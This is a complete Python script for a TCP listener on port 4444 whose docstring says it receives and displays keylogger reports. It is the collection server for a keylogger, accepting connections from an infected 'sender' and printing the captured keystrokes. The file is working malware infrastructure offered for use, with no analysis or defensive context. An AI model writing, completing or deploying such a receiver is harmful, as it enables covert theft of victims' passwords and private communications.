import socket
import sys

HOST = "0.0.0.0"  # Listen on all interfaces
PORT = 4444

def start_listener():
    """Starts the TCP server to listen for and display keylogger reports."""
    
    try:
        # Create a socket object using IPv4 and TCP
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # Allows reuse of the address so you can restart the script quickly
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
        
        s.bind((HOST, PORT))
        s.listen(5)  # Accept up to 5 pending connections
        print(f"[*] Listening for connections on {HOST}:{PORT}")
        print("[*] Waiting for sender to connect...\n")
        
        while True:
            try:
                # Accept an incoming connection with timeout
                s.settimeout(None)
                conn, addr = s.accept()
                conn.settimeout(5)
                
                print(f"[+] CONNECTION RECEIVED from {addr[0]}:{addr[1]}")
                
                try:
                    # Receive the data
                    data = conn.recv(10240).decode('utf-8', errors='ignore')
                    
                    if data:
                        print("\n" + "="*50)
                        print(data)
                        print("="*50 + "\n")
                    else:
                        print("[-] No data received\n")
                        
                except socket.timeout:
                    print("[-] Connection timeout\n")
                finally:
                    conn.close()
                    
            except KeyboardInterrupt:
                print("\n[*] Listener shutting down.")
                break
            except Exception as e:
                print(f"[!] Error: {e}\n")
        
    finally:
        s.close()
        print("[*] Listener closed.")

if __name__ == "__main__":
    start_listener()